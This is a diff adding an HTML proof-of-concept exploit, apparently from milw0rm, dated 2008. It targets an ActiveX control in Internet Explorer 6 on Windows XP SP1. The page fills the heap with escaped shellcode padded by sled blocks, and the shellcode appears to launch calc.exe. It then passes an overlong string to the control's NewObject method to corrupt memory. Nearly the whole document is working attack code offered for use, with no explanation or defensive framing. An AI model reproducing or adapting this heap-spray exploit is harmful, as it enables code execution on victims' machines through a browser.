@@ -1,0 +1,37 @@
+<html>
+<body>
+
+<object classid=clsid:32E26FD9-F435-4A20-A561-35D4B987CFDC id=target />
+</object>
+
+<script language=javascript>
+
+	// k`sOSe 08/08/2008
+	// tested in IE6, XP SP1
+	var shellcode = unescape("%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%u315f%u60f6%u6456%u468b%u8b30%u0c40%u708b%uad1c%u688b%u8908%u83f8%u6ac0%u6850%u8af0%u5f04%u9868%u8afe%u570e%ue7ff%u3a43%u575c%u4e49%u4f44%u5357%u535c%u5359%u4554%u334d%u5c32%u4143%u434c%u452e%u4558%u4100");
+
+	var block = unescape("%u0909%u0909");
+	while (block.length < 0x25000) block += block;
+
+	var memory = new Array();
+
+	var i=0;
+	for (;i<1000;i++) memory[i] += block + shellcode;
+
+	memory[i] += shellcode;
+
+	var buf2;
+	for (var i=0; i<151; i++) buf2 += "X";
+
+	buf2 += unescape("%09%09%09%09");
+
+
+
+	target.NewObject(buf2);
+
+</script>
+
+</body>
+</html>
+
+# milw0rm.com [2008-08-10]
